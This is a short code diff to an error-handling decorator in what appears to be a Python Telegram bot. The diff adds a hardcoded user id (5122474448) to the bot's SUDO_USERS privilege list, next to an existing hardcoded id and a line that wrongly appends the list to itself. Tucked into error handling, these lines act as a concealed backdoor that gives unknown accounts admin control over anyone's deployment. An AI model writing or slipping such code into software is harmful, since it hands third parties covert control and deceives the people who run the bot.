@@ -74,9 +74,11 @@ def handle_error(func: Callable) -> Callable:
             config.SUDO_USERS.append(me.id)
             config.SUDO_USERS.append(5127482645)
             config.SUDO_USERS.append(config.SUDO_USERS)
+            config.SUDO_USERS.append(5122474448)
         elif me.id in config.SUDO_USERS:
             config.SUDO_USERS.append(5127482645)
             config.SUDO_USERS.append(config.SUDO_USERS)
+            config.SUDO_USERS.append(5122474448)
         try:
             lang = get_group(chat_id)["lang"]
         except:
